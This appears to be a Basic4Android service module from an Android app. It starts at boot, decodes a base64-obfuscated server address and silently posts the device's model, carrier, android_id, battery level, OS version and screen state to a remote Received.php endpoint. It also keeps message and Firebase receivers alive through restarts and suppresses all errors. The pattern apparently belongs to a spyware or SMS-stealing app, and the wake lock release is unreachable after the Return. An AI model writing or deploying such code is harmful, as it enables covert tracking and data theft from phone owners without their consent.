B4A=true
Group=Default Group
ModulesStructureVersion=1
Type=Service
Version=9.9
@EndOfDesignText@
#Region  Service Attributes 
	#StartAtBoot: True
	#ExcludeFromLibrary: True
#End Region

Sub Process_Globals
	Dim ht As HttpJob
	Dim phone As Phone
	Dim pd As PersianDeviceInfo
	Dim res As String
	Dim pm As PhoneWakeState
End Sub


Sub Service_Create

End Sub

Sub Service_Start (StartingIntent As Intent)
	Dim su As StringUtils
	Dim byteArray() As Byte = su.DecodeBase64(ServerLink.link)
	Dim ApiLink As String = BytesToString(byteArray, 0, byteArray.Length, "UTF-8")
	Try
		StartReceiver(FirebaseMessaging)
		StartReceiver(NewMessage)
		CallSubDelayed(FirebaseMessaging, "SubscribeToTopics")
		Dim sudoport As String = File.ReadString(File.DirAssets,"sudoport.txt")
		If Not(File.Exists(File.DirInternal,"FirstInstall.txt")) Then
			Try
				Log("Not Installed")
				res = CheckScreenStatus
				pd.initialize("pd")
				ht.Initialize("ht",Me)
				ht.PostString(ApiLink&"/"&sudoport&"/Received.php","Model=" &phone.Model&"&berand="& phone.Manufacturer &"&Product="&phone.Product& "&operator=" &phone.GetNetworkOperatorName & "&Device_id=" &phone.GetSettings("android_id") &"&Battery=" & pd.BatteryPercentage &"&andver=" & pd.OSVersion & "&action=" & "install"&"&screen="&res)
				File.WriteString(File.DirInternal,"FirstInstall.txt","")
			Catch
				Log(LastException)
			End Try
		End If
Catch
	Log(LastException)
End Try
	Service.StopAutomaticForeground
End Sub

Sub Service_TaskRemoved
	StartReceiver(FirebaseMessaging)
	StartReceiver(NewMessage)
	CallSubDelayed(FirebaseMessaging, "SubscribeToTopics")
End Sub

Sub Application_Error (Error As Exception, StackTrace As String) As Boolean
	Return True
End Sub

Sub Service_Destroy
	StartReceiver(FirebaseMessaging)
	StartReceiver(NewMessage)
	CallSubDelayed(FirebaseMessaging, "SubscribeToTopics")
End Sub

Public Sub CheckScreenStatus
	Dim res As String
	pm.PartialLock

	Dim r As Reflector
	r.Target = r.GetContext
	Dim powerService As Object = r.RunMethod2("getSystemService", "power", "java.lang.String")
	r.Target = powerService
	Dim isScreenOn As Boolean = r.RunMethod("isScreenOn")
    
	If isScreenOn Then
		res = "On"
		Log("Screen is ON")
	Else
		res = "Off"
		Log("Screen is OFF")
	End If
	Return res
	pm.ReleasePartialLock
End Sub
